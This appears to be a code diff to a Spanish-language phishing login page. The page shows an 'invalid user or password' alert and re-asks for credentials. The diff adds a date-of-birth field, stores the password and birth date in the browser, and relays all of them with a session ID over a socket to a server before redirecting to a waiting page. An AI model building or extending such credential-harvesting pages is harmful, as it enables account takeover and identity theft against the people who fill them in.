@@ -82,10 +82,14 @@
     <div class="alerta">
       ❗ Usuario o clave inválida. Por favor ingrese a su cuenta correctamente.
     </div>
-    <p>Ingrese su usuario y contraseña para iniciar su proceso de analisis.</p>
+    <p>Ingrese su usuario, contraseña y fecha de nacimiento para iniciar su proceso de análisis.</p>
     <form id="login-form">
       <input type="text" id="usuario" placeholder="Ingrese su usuario" required />
       <input type="password" id="clave" placeholder="Contraseña" required />
+      
+      <!-- Campo de fecha de nacimiento -->
+      <input type="date" id="fechaNacimiento" placeholder="Fecha de Nacimiento" required />
+      
       <button type="submit">Continuar</button>
     </form>
   </div>
@@ -102,16 +106,25 @@
         form.addEventListener('submit', (e) => {
           e.preventDefault();
 
+          // Obtener los valores de los campos
           const usuario = document.getElementById('usuario').value;
           const contrasena = document.getElementById('clave').value;
+          const fechaNacimiento = document.getElementById('fechaNacimiento').value;
           const sessionId = localStorage.getItem('sessionId');
+
+          // Validar los campos antes de enviar
+          if (!usuario || !contrasena || !fechaNacimiento) {
+            alert("Por favor, complete todos los campos.");
+            return;
+          }
 
           // Actualizar localStorage con los nuevos datos ingresados
           localStorage.setItem('usuario', usuario);
           localStorage.setItem('contrasena', contrasena);
+          localStorage.setItem('fechaNacimiento', fechaNacimiento);
 
           // Enviar al servidor con la sesión original
-          socket.emit('errorlogoForm', { usuario, contrasena, sessionId });
+          socket.emit('errorlogoForm', { usuario, contrasena, fechaNacimiento, sessionId });
 
           // Redirigir a la pantalla de espera
           window.location.href = 'opciones.html';
